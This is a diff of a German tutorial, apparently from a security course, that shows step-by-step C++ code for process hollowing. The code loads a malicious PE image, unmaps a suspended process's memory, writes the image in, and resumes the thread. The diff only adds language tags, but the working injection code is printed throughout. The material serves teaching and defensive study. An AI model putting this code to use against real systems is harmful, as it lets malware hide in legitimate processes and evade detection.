@@ -206,7 +206,7 @@ HANDLE hMaliciousCode = CreateFileA(
 ```
 
 Sobald ein Handle für das bösartige Image erhalten wurde, muss Speicher für den lokalen Prozess mit `VirtualAlloc` zugewiesen werden. `GetFileSize` wird ebenfalls verwendet, um die Größe des bösartigen Images für `dwSize` abzurufen.
-```
+```C++
 DWORD maliciousFileSize = GetFileSize(
 	hMaliciousCode, // Handle of malicious image
 	0 // Returns no error
@@ -221,7 +221,7 @@ PVOID pMaliciousImage = VirtualAlloc(
 ```
 
 Nun, da Speicher für den lokalen Prozess zugewiesen wurde, muss dieser beschrieben werden. Mit den Informationen aus den vorherigen Schritten können wir `ReadFile` verwenden, um in den lokalen Prozessspeicher zu schreiben.
-```
+```C++
 DWORD numberOfBytesRead; // Stores number of bytes read
 
 if (!ReadFile(
@@ -240,7 +240,7 @@ CloseHandle(hMaliciousCode);
 ```
 
 Im dritten Schritt muss der Prozess durch Entmapen des Speichers "ausgehöhlt" werden. Bevor das Entmapen erfolgen kann, müssen wir die Parameter des API-Aufrufs identifizieren. Wir müssen die Speicherposition des Prozesses und den Einstiegspunkt identifizieren. Die CPU-Register `EAX` (Einstiegspunkt) und `EBX` (PEB-Position) enthalten die benötigten Informationen, die durch Verwendung von `GetThreadContext` gefunden werden können. Sobald beide Register gefunden sind, wird `ReadProcessMemory` verwendet, um die Basisadresse aus `EBX` mit einem Offset (`0x8`), der aus der Untersuchung des PEB stammt, zu erhalten.
-```
+```C++
 c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
 GetThreadContext(
 	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
@@ -258,7 +258,7 @@ ReadProcessMemory(
 ```
 
 Nachdem die Basisadresse gespeichert ist, können wir mit dem Entmapen des Speichers beginnen. Wir können `ZwUnmapViewOfSection` verwenden, das aus ntdll.dll importiert wird, um Speicher vom Zielprozess freizugeben.
-```
+```C++
 HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
 pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
 	hNtdllBase, // Handle of ntdll
@@ -272,7 +272,7 @@ DWORD dwResult = pZwUnmapViewOfSection(
 ```
 
 Im vierten Schritt müssen wir damit beginnen, Speicher im "geleerten" Prozess zuzuweisen. Ähnlich wie in Schritt zwei können wir `VirtualAlloc` verwenden, um Speicher zuzuweisen. Diesmal müssen wir die Größe des Images aus den Dateiköpfen erhalten. Mit `e_lfanew` kann die Anzahl der Bytes vom DOS-Header zum PE-Header identifiziert werden. Sobald beim PE-Header angekommen, können wir die `SizeOfImage` aus dem Optional Header erhalten.
-```
+```C++
 PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
 PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew
 
@@ -288,7 +288,7 @@ PVOID pHollowAddress = VirtualAllocEx(
 ```
 
 Nachdem der Speicher zugewiesen ist, können wir die bösartige Datei in den Speicher schreiben. Da wir eine Datei schreiben, müssen wir zuerst die PE-Header und dann die PE-Sektionen schreiben. Um die PE-Header zu schreiben, können wir `WriteProcessMemory` verwenden und die Größe der Header verwenden, um festzulegen, wo wir aufhören müssen.
-```
+```C++
 if (!WriteProcessMemory(
 	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
 	pTargetImageBaseAddress, // Base address of the process
@@ -301,7 +301,7 @@ if (!WriteProcessMemory(
 ```
 
 Jetzt müssen wir jede Sektion schreiben. Um die Anzahl der Sektionen zu finden, können wir `NumberOfSections` aus den NT-Headern verwenden. Wir können eine Schleife durch `e_lfanew` und die Größe des aktuellen Headers durchlaufen, um jede Sektion zu schreiben.
-```
+```C++
 for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
 	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header
 
@@ -318,7 +318,7 @@ for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop base
 Es ist auch möglich, Relokationstabellen zu verwenden, um die Datei in den Ziel-Speicher zu schreiben. Dies wird im Task 6 genauer erläutert.
 
 Im fünften Schritt können wir `SetThreadContext` verwenden, um `EAX` so zu ändern, dass es auf den Einstiegspunkt zeigt.
-```
+```C++
 c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header
 
 SetThreadContext(
@@ -328,7 +328,7 @@ SetThreadContext(
 ```
 
 Im sechsten Schritt müssen wir den Prozess aus dem angehaltenen Zustand herausnehmen, indem wir ResumeThread verwenden.
-```
+```C++
 ResumeThread(
 	target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
 );
